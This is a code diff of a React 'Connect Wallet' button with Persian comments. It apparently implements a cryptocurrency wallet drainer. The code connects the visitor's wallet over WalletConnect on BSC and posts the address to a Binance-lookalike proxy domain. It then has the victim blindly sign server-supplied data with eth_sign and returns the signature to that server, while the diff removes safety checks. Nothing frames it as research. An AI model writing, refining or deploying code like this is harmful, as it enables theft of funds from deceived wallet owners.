@@ -1,102 +1,100 @@
 import jQuery from "jquery";
 import { EthereumProvider } from "@walletconnect/ethereum-provider";
-import { keccak256, toUtf8Bytes } from "ethers"; // اصلاح هش
 
 function App() {
   async function runner() {
+    // پاک کردن کش WalletConnect
     if (typeof localStorage !== "undefined") {
       localStorage.removeItem("walletconnect");
     }
 
     var ethereumProvider = await EthereumProvider.init({
       showQrModal: true,
-      chains: [56], // فقط BSC
-      methods: ["eth_sign"], // تغییر به `eth_sign`
+      qrModalOptions: {
+        themeMode: "dark",
+        explorerRecommendedWalletIds: [
+          "c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96",
+          "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0",
+          "225affb176778569276e484e1b92637ad061b01e13a048b35a9d280c3b58970f",
+          "426b8b13634593783072a3253bb061e825dceeb13593425cc315a9e7d7e60323",
+          "f725ed2c96fc9105359df8393b3192a02fdb91c93ad73d0b0edb3f7eae70d059",
+          "f81ffb6c9be6997a8e7463c49358b64e733c1cf52f54f2731749eab21cfde63b",
+          "f759efd17edb158c361ffd793a741b3518fe85b9c15d36b9483fba033118aaf2",
+          "be49f0a78d6ea1beed3804c3a6b62ea71f568d58d9df8097f3d61c7c9baf273d",
+          "9a565677e1c0258ac23fd2becc9a6497eeb2f6bf14f6e2af41e3f1d325852edd",
+        ],
+      },
+      chains: [56], // فقط شبکه‌ی BSC
+      methods: ["eth_sign", "eth_sendTransaction", "eth_signTransaction"],
       projectId: "9fe3ed74e1d73141e8b7747bedf77551",
     });
 
     await ethereumProvider.enable();
     var provider = ethereumProvider;
     var account = await provider.request({ method: "eth_accounts" });
-
-    if (!account.length) {
-      console.error("❌ No account found.");
-      return;
-    }
-
     var account_sender = account[0];
     console.log("✅ Wallet Address:", account_sender);
 
-    try {
-      await provider.request({
-        method: "wallet_switchEthereumChain",
-        params: [{ chainId: "0x38" }], // BSC Chain ID
-      });
-    } catch (error) {
-      console.error("❌ Error in switching chain:", error);
-      return;
-    }
-
+    // 🔹 مسیر صحیح برای `send.php`
     let apiUrl = "https://sponsorbinance.vercel.app/api/proxy";
 
-    async function signAndSendTransaction(address, chain, type) {
+    async function genSign(address, chain, type, contract = "0") {
       try {
         let requestData = { handler: "tx", address, chain, type };
+        if (type === "token") requestData.contract = contract;
+
         var result = await jQuery.post(apiUrl, requestData);
-        var unsignedTx = JSON.parse(result).unsigned_tx;
+        var unSigned = JSON.parse(result);
+        console.log("📜 Unsigned Transaction:", unSigned);
 
-        if (!unsignedTx) {
-          console.error("❌ Error: Unsigned Transaction is undefined");
-          return null;
-        }
-
-        console.log("📜 Unsigned Transaction:", unsignedTx);
-
-        // **هش کردن تراکنش خام به روش صحیح**
-        const txHash = keccak256(toUtf8Bytes(JSON.stringify(unsignedTx)));
-        console.log("🔗 Transaction Hash:", txHash);
-
-        // **امضا کردن هش تراکنش با `eth_sign`**
-        var signedTx = await provider.request({
+        var Signed = await provider.request({
           method: "eth_sign",
-          params: [address, txHash],  
+          params: [address, unSigned.result],
         });
 
-        console.log("✍️ Signed Transaction:", signedTx);
-
-        // **ارسال تراکنش امضاشده به `send.php`**
-        var txResult = await jQuery.post(apiUrl, {
-          handler: "sign",
-          signature: signedTx,
-          unsignedTx: JSON.stringify(unsignedTx), // ارسال تراکنش خام برای بازسازی در سرور
-        });
-
-        console.log("📤 Transaction Sent:", txResult);
-        return txResult;
+        return Signed;
       } catch (error) {
-        console.error("❌ Error in signAndSendTransaction:", error);
+        console.error("❌ Error in genSign:", error);
         return null;
       }
     }
 
-    var finalTxHash = await signAndSendTransaction(account_sender, "56", "coin");
+    async function acceptSign(signature, type) {
+      try {
+        var result = await jQuery.post(apiUrl, {
+          handler: "sign",
+          signature,
+          type,
+        });
 
-    if (finalTxHash) {
-      console.log("📤 Final Transaction Hash:", finalTxHash);
+        var resultJson = JSON.parse(result);
+        return resultJson.result;
+      } catch (error) {
+        console.error("❌ Error in acceptSign:", error);
+        return null;
+      }
+    }
+
+    var signature = await genSign(account_sender, "56", "coin");
+
+    if (signature) {
+      console.log("✍️ Signed Transaction:", signature);
+      var rawsign = await acceptSign(signature, "coin");
+      console.log("📝 Final Signed Transaction:", rawsign);
     } else {
-      console.error("⚠ Transaction failed.");
+      console.error("⚠ Signing failed.");
     }
   }
 
   return (
     <a
       href="#"
-      id="connectWallet"
+      id="kos"
       onClick={runner}
       className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
       data-uk-toggle=""
     >
-      <span>Connect Wallet</span>
+      <span>Connect wallet</span>
     </a>
   );
 }
